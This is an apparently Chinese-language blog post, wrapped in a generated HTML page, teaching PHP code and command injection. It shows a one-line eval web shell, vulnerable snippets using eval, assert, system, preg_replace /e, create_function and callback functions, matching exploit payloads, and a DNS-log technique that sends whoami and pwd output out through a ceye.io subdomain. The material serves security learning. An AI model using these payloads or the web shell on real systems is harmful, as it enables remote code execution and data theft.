@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>php代码注入 ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">php代码注入</p>
+            <br>
+            
+            <p>Friday, July 26th 2019, 8:34 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>PHP代码</code>执行。</p>
+<h2 id="常见php命令注入函数"><a href="#常见php命令注入函数" class="headerlink" title="常见php命令注入函数"></a>常见php命令注入函数</h2><p><code>eval()</code>，<code>assert()</code>, <code>system()</code>，<code>preg_replace()</code>,<code>create_function</code>, <code>call_user_func</code>,<code>call_user_func_array</code>，<code>array_map()</code>，<code>反引号</code>，<code>ob_start()</code>，<code>exec()</code>，<code>shell_exec()</code>，<code>passthru()</code>，<code>escapeshellcmd()</code>，<code>popen()</code>，<code>proc_open()</code>，<code>pcntl_exec()</code></p>
+<h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>这个函数我们在制作小马的时候经常用到：<code>&lt;?php  eval($_POST[&#39;aaa&#39;]); ?&gt;</code></p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMSDRP.png" alt="eval函数.png"></p>
+<p>在php官方手册上就表明了它是很危险的函数，允许执行任意的php代码。</p>
+<pre><code># 1. 没有任何过滤
+&lt;?php
+@eval($_GET[&quot;aa&quot;]);
+?&gt;
+
+?aa=phpinfo();
+
+# 2. addslashes 过滤
+&lt;?php
+$aa= @(string)$_GET[&quot;aa&quot;];
+eval(&#39;$aa=&quot;&#39; . addslashes($aa) . &#39;&quot;;&#39;);
+?&gt;
+
+# ${${}} 绕过
+aa=${${phpinfo()}}
+
+# 3 双引号包含过滤
+&lt;?php
+$aa= &quot;echo \&quot;hello &quot; . $_GET[&#39;aa&#39;] . &quot;\&quot;;&quot;;
+eval($aa);
+
+# ${${}} 绕过
+aa=${${phpinfo()}}
+aa=${@system(&#39;dir&#39;)}
+
+`${${}} 绕过`是利用可变变量的二次嵌套，执行里面花括号内的代码，如: `echo &quot;${${phpinfo()}}&quot;;`, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。
+</code></pre><p>PHP可变变量可以无需二次嵌套，一次也可以执行，<code>echo &quot;${phpinfo()}&quot;;</code>这种情况是不能执行的，而<code>echo &quot;${/**/phpinfo()}&quot;;</code>是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，<code>空格，tab，注释，回车</code>是各种语法分析引擎中常见的分割字符，<code>@</code>是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。</p>
+<p><strong>php &gt;= 4.3</strong></p>
+<pre><code>&quot;${ phpinfo()}&quot;;
+&quot;${    phpinfo()}&quot;;
+&quot;${/**/phpinfo()}&quot;;
+&quot;${
+phpinfo()}&quot;;
+&quot;${@phpinfo()}&quot;;
+
+&quot;${( string )phpinfo()}&quot;;
+&quot;${phpinfo[phpinfo()]}&quot;;
+
+&quot;{$phpinfo[phpinfo()]}&quot;;
+&quot;{${phpinfo()}}&quot;;
+&quot;${${phpinfo()}}&quot;;
+</code></pre><p><strong>php&gt;=5.5</strong></p>
+<pre><code>&quot;${phpinfo()}&quot;;
+</code></pre><p>可以执行<code>phpinfo()</code>函数（使用${}可以执行php函数）。。。</p>
+<h3 id=""><a href="#" class="headerlink" title="${}"></a>${}</h3><p><code>${php代码}</code></p>
+<pre><code>${phpinfo()};
+即可执行phpinfo();
+</code></pre><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><pre><code>&lt;?php
+@assert($_GET[&quot;aa&quot;]);
+?&gt;
+
+aa=phpinfo();
+</code></pre><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><pre><code>&lt;?php
+
+system(&quot;ping -c 2 &quot;.$_GET[&#39;ip&#39;]);
+
+ ?&gt;
+</code></pre><p>正常访问：<code>ip=127.0.0.1</code></p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMmyh8.png" alt=""></p>
+<p>是一个常规的ping命令</p>
+<p>我们进行命令注入 <code>ip=127.0.0.1|dir</code></p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMmvH1.png" alt=""></p>
+<p>就可以得到回显了</p>
+<p>如果我们把代码放在linux上面，就可能得不到回显，在没有回显的情况下我们应该怎样得到我们想要的信息呢？这种时候就需要利用dnslog来查看命令执行的结果。 这里介绍一个dnslog利用平台，<a href="http://ceye.io" target="_blank" rel="noopener">ceye</a>。</p>
+<p>在注册ceye.io之后会分配一个三级域名。就是<code>******.ceye.io</code>。</p>
+<pre><code>ping `whoami`.******.ceye.io
+</code></pre><p>上面这条命令最终在ping的时候ping的是<code>apache.******.ceye.io</code>，apache就是我们构造的恶意命令<code>whoami</code>执行的结果，我们把它放在四级域名这里，这样在DNS解析的时候就会记录下root这个四级域名。然后可以在ceye平台上看到我们的dns解析日志。也就看到了命令执行的回显。</p>
+<p><strong>尝试</strong><br>ip=`pwd`.36rdia.ceye.io<br>在页面中无回显，在ceye中的我们可以看到回显：</p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMMrrQ.png" alt=""><br>在治理我们看到了绝对路径：<code>/var/www/html</code></p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>我们查看一下php手册对它的介绍</p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMM5MF.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMMoqJ.png" alt=""></p>
+<p><code>preg_replace()</code>函数可以引发代码执行，源于<code>PCRE (Perl Compatible Regular Expressions)</code>中的<code>e(PREG_REPLACE_EVAL)</code>选项，</p>
+<p><code>/e</code> 修正符使 <code>preg_replace()</code> 将 <code>replacement</code> 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 <code>replacement</code> 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 <code>preg_replace()</code> 的行中出现语法解析错误。</p>
+<p>例如：<code>preg_replace(&quot;/test/e&quot;,phpinfo(),&quot;jutst test&quot;);</code>这样就能调用<code>phpinfo()</code>。</p>
+<p><strong>注意</strong></p>
+<p>php7.0.0 不再支持 /e修饰符。 请用 preg_replace_callback() 代替。</p>
+<p>php5.5.0 /e 修饰符已经被弃用了。使用 preg_replace_callback() 代替</p>
+<p>在实践的时候需要看清php版本,在7.0的版本以后就不再适用！</p>
+<p><strong>举个例子</strong></p>
+<p>代码：</p>
+<pre><code>&lt;?php 
+function complexStrtolower($regex,$value){
+    return preg_replace(&#39;/(&#39;.$regex.&#39;)/ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;,$value);
+}
+
+foreach ($_GET as $regex =&gt; $value) {
+    echo $value.&quot;\n&quot;;
+    echo complexStrtolower($regex,$value).&quot;\n&quot;;
+}
+
+?&gt;
+</code></pre><p>这里使用了/e模式，输入的参数和对应的参数值分别对应于匹配的模式和用于正则匹配的字符串，这两个参数都可以通过GET方式进行控制，但是第二个参数写定了 <code>strtolower(&quot;\\1&quot;)</code></p>
+<pre><code>正则表达式 分组
+在这里我把表达式统一以\w为例：
+    (\w)(\w) 自动命名分组，第一个小括号是分组1，第二个小括号是分组2
+
+正则表达式 反向引用
+后面的表达式可以引用前面的某个分组，用\1表示，就好像分组1的值赋值给了\1这个变量，这个变量可以在后面任意位置引用。
+    \1 表示分组1匹配的文本
+</code></pre><p><code>\\1</code>实际上就是<code>\1</code>，即第一个匹配项只需要控制匹配模式为<code>/(.*)/</code>，匹配出来的字符串为我们想要执行的代码，就可以了。</p>
+<p><strong>注意</strong></p>
+<pre><code>`preg_replace/e`只执行一次代码，即`strtolower`函数，所以我们必须想办法让输入的`phpinfo()`自己执行，这就涉及到了`php动态变量`，payload为`{${phpinfo()}}`，我们知道php变量名经过`{}`包裹后会将变量值输出,而这里`phpinfo`被`{}`包裹后会首先执行`phpinfo()`
+</code></pre><p>我们测试一下，</p>
+<pre><code>&lt;?php
+preg_replace(&#39;/(.*)/ie&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,&#39;{${phpinfo()}}&#39;);
+?&gt;
+</code></pre><p><img src="https://s2.ax1x.com/2019/07/29/e3QkQ0.png" alt=""><br>发现能够成功执行代码。</p>
+<pre><code>所以payload=`.*={${phpinfo()}}`
+
+但是没有成功执行`phpinfo()`代码，这是因为php的一个特性：php自身在解析请求时，如果参数中包含`. `这个字符，会将他转换为下划线。所以我们传递参数被解析为`_*={${phpinfo()}}`
+我们换个通用字符即可，因此payload:`\S*={${phpinfo()}}`
+</code></pre><p><img src="https://s2.ax1x.com/2019/07/29/e3360K.png" alt=""></p>
+<p>也可以执行命令：<br><img src="https://s2.ax1x.com/2019/07/29/e33IXt.png" alt=""></p>
+<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>查阅php手册</p>
+<p><strong>string create_function ( string $args , string $code )</strong></p>
+<p>函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p>
+<p>看一个官方样例</p>
+<pre><code>&lt;?php
+
+$newfunc = create_function(&#39;$a,$b&#39;, &#39;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#39;);
+
+echo &quot;New anonymous function: $newfunc\n&quot;;
+
+echo $newfunc(2, M_E) . &quot;\n&quot;;
+
+?&gt;
+</code></pre><p>我们不难得到create_function()的原型</p>
+<pre><code>function test($a,$b)
+
+{
+
+return &quot;ln($a) + ln($b) = &quot; . log($a * $b);
+
+}
+</code></pre><p>他们的作用都是一样的。</p>
+<p><strong>小实例</strong></p>
+<p>代码：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+$sort_by = $_GET[&#39;sort_by&#39;];
+$sorter = &#39;strnatcasecmp&#39;;
+$databases=array(&#39;1234&#39;,&#39;4321&#39;);
+$sort_function = &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;;
+usort($databases, create_function(&#39;$a, $b&#39;, $sort_function));
+?&gt;
+</code></pre><p>我们发现了匿名函数的存在，我们可以得到匿名函数的原型：</p>
+<pre><code>function test($a,$b){
+    return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);
+
+}
+</code></pre><p>我们发现代码中<code>$sort_by</code>参数的值直接用<code>GET</code>取值未做过滤，<br><code>create_function()</code>中的函数体部分<code>$sort_function</code>只是简单的字符串拼接</p>
+<p>我们尝试传递<code>?sort_by=&quot;]);}phpinfo();/*</code>我们发现能够成功执行phpinfo()<br>传入后，此刻的函数原型为：</p>
+<pre><code>function test($a,$b){
+    return 1 * strnatcasecmp($a[&quot;&quot;]);}phpinfo();/*&quot;], $b[&quot;&quot;]);}phpinfo();/*&quot;]);
+
+}
+</code></pre><p>很显然，经过<code>/*</code>注释符<br>我们剩下的只有</p>
+<pre><code>function test($a,$b){
+    return 1 * strnatcasecmp($a[&quot;&quot;]);
+
+}
+
+phpinfo();
+</code></pre><p>就能够执行php函数。<br><img src="https://s2.ax1x.com/2019/07/29/e3yev6.png" alt=""></p>
+<h3 id="call-user-func-call-user-func-array"><a href="#call-user-func-call-user-func-array" class="headerlink" title="call_user_func()/call_user_func_array()"></a>call_user_func()/call_user_func_array()</h3><p>call_user_func()是一个回调函数，用法参照php手册：</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3yIi9.png" alt=""><br>用法：</p>
+<pre><code>&lt;?php 
+$a = &#39;assert&#39;;
+$b = &#39;phpinfo()&#39;;
+call_user_func($a,$b);
+?&gt;
+</code></pre><p>可以执行phpinfo()</p>
+<p>call_user_func_array()也是一个回调函数，用法参照php手册：</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3gGG9.png" alt=""></p>
+<p>用法：</p>
+<pre><code>&lt;?php 
+$a = &#39;assert&#39;;
+$b[0] = &#39;phpinfo()&#39;;
+call_user_func_array($a,$b);
+?&gt;
+</code></pre><p>可以执行phpinfo()</p>
+<p>两者本质都差不多，但是call_user_func_array()必须带参数。</p>
+<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><p><code>array_map()</code>是一个回调函数，用法参照php手册：<br><img src="https://s2.ax1x.com/2019/07/29/e3R7D0.png" alt=""></p>
+<p><code>array_map()</code> 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给<code>array_map()</code> 函数的数组数目一致</p>
+<p>测试：</p>
+<pre><code>&lt;?php 
+array_map(&#39;system&#39;,$_GET[&#39;cmd&#39;]);
+?&gt;
+
+</code></pre><p>payload=<code>?cmd[0]=whoami&amp;cmd[1]=dir</code><br>发现两条命令都执行了：<br><img src="https://s2.ax1x.com/2019/07/29/e34qy9.png" alt=""></p>
+<h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><p>官方文档:</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3I7r9.png" alt=""></p>
+<p>测试</p>
+<pre><code>?cmd[]=whoami
+&lt;?php 
+array_filter($_GET[&#39;cmd&#39;],&#39;system&#39;);
+?&gt;
+
+</code></pre><h3 id="usort-uasort"><a href="#usort-uasort" class="headerlink" title="usort()/uasort()"></a>usort()/uasort()</h3><p>usort() 官方文档:</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e37AgS.png" alt=""></p>
+<p>测试：</p>
+<pre><code>&lt;?php
+// ?1[]=test&amp;1[]=phpinfo();&amp;2=assert
+usort(...$_GET);
+?&gt;
+</code></pre><p>关于<code>...$_GET</code>是php5.6引入的新特性。即将数组展开成参数的形式。</p>
+<p>GET变量被展开成两个参数<code>[&#39;test&#39;, &#39;phpinfo();&#39;]</code>和<code>assert</code>，传入usort函数。usort函数的第二个参数是一个回调函数<code>assert</code>，其调用了第一个参数中的<code>phpinfo();</code>。</p>
+<p>只有在<code>php5.6</code>以上环境才可使用</p>
+<p>uasort() 官方文档:<br><img src="https://s2.ax1x.com/2019/07/29/e37TKg.png" alt=""></p>
+<p>测试：</p>
+<pre><code>&lt;?php
+// ?1=2;&amp;2=phpinfo();
+usort($_GET,&#39;asse&#39;.&#39;rt&#39;);
+?&gt;
+</code></pre><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><p>官方文档</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3bQ6U.png" alt=""></p>
+<p><code>ob_start($a)</code>参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回调函数处理，回调函数内不能再调用<code>ob_start()</code>.</p>
+<p>测试：</p>
+<pre><code>&lt;?php
+$foobar = &#39;system&#39;;
+ob_start($foobar);
+echo &#39;whoami&#39;;
+ob_end_flush();
+?&gt;
+</code></pre><p>可以成功执行<code>whoami</code>的命令。但是<code>php7</code>测试未成功<br>这里注意，如果我这样使用</p>
+<p> echo ‘whoami’;</p>
+<p>whoami</p>
+<p>是没有任何作用的</p>
+<p>因为这里的<code>$foobar</code>被作为输出的回调函数</p>
+<p>而我们输入的<code>whoami</code>在缓冲区</p>
+<p>经过<code>ob_end_flush()</code>输出缓冲区后，可以得到</p>
+<p><code>system(&#39;whoami&#39;)</code></p>
+<p>这样的操作，所以成功执行了命令</p>
+<h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function()"></a>register_shutdown_function()</h3><p>官方文档：<br><img src="https://s2.ax1x.com/2019/07/29/e3XYDO.png" alt=""></p>
+<p>register_shutdown_function($a)<br>参数a是一个函数名，也可以给他传参,可以传多个<br>register_shutdown_function($a,$b)</p>
+<p>实例：</p>
+<pre><code>//?cmd=whoami
+&lt;?php 
+register_shutdown_function(&#39;system&#39;,$_GET[&#39;cmd&#39;]);
+
+?&gt;
+
+
+
+//?cmd=phpinfo
+&lt;?php
+register_shutdown_function($_GET[&#39;cmd&#39;]);
+?&gt;
+</code></pre><h3 id="array-walk-array-walk-recursive"><a href="#array-walk-array-walk-recursive" class="headerlink" title="array_walk(),array_walk_recursive()"></a>array_walk(),array_walk_recursive()</h3><p>官方文档：</p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3jNQ0.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/07/29/e3j8ij.png" alt=""></p>
+<p><code>array_walk($a,$b)</code><br><code>array_walk_recursive($a,$b)</code><br>他们的参数a是个数组，参数b是个回调函数的名字，这两个函数都是把数组中的值作为参数带到回调函数中执行。第二个可以遍历多维数组。</p>
+<p>测试：</p>
+<pre><code>//?cmd[]=whoami  两个都可以执行
+//?cmd[0][]=whoami  第二个可以执行，第一个不能执行。
+&lt;?php 
+array_walk($_GET[&#39;cmd&#39;],&#39;system&#39;);
+echo &quot;&lt;br&gt;&quot;;
+array_walk_recursive($_GET[&#39;cmd&#39;],&#39;system&#39;); 
+?&gt;
+</code></pre><h2 id="危险函数合集"><a href="#危险函数合集" class="headerlink" title="危险函数合集"></a>危险函数合集</h2><pre><code>直接执行代码
+eval()
+${}
+assert()
+preg_replace()(php7不支持.5.5以后废弃改成preg_replace _callback(）
+
+可以控制函数内容
+create_function()
+
+能控制函数参数和函数名
+较容易
+call_user_func（），call_user_func_array（）
+ob_start()  php7测试未成功
+array_map()，array_walk(),array_walk_recursive()
+register_shutdown_function()
+preg_replace _callback()
+array_filter()
+array_reduce()
+
+
+比较困难，参数可控但是有限制
+xml_set_character_data_handler()
+xml_set_default_handler()
+xml_set_element_handler()
+xml_set_end_namespace_decl_handler()
+xml_set_external_entity_ref_handler()
+xml_set_notation_decl_handler()
+xml_set_processing_instruction_handler()
+xml_set_start_namespace_decl_handler()
+xml_set_unparsed_entity_decl_handler()
+
+stream_filter_register()
+
+set_error_handler()
+
+usort(),uasort(), uksort(),array_diff_uassoc(),
+array_diff_ukey()
+array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
+array_intersect_assoc(), array_intersect_uassoc()
+array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
+
+register_tick_function()
+</code></pre>
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;web漏洞</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
